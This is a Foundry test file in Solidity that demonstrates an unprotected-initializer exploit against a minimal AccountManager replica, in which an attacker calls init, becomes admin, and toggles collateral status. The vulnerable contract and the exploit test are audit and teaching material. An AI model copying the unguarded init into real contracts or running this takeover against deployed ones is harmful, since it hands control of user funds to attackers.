pragma solidity 0.8.20;

import "forge-std/Test.sol";

interface IRegistry {}

// Minimal Pausable stub with admin logic
contract Pausable {
    address public admin;
    modifier adminOnly() {
        require(msg.sender == admin, "admin only");
        _;
    }
    function initPausable(address _admin) internal {
        admin = _admin;
    }
}

// Minimal vulnerable replica (only touched state + functions)
contract AccountManager is Pausable {
    bool private initialized;
    IRegistry public registry;
    mapping(address => bool) public isCollateralAllowed;

    function init(IRegistry _registry) external {
        if (initialized) revert("already");
        initialized = true;
        initPausable(msg.sender);
        registry = _registry;
    }

    function toggleCollateralStatus(address token) external adminOnly {
        isCollateralAllowed[token] = !isCollateralAllowed[token];
    }
}

contract AccountManagerTest is Test {
    AccountManager target;
    address attacker;

    function setUp() public {
        target = new AccountManager();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_init() public {
        // Attacker calls init and becomes admin via initPausable(msg.sender)
        vm.prank(attacker);
        target.init(IRegistry(address(0)));

        // As admin, attacker can call adminOnly function toggleCollateralStatus
        vm.prank(attacker);
        target.toggleCollateralStatus(address(0x123));

        assertEq(target.isCollateralAllowed(address(0x123)), true);
    }
}
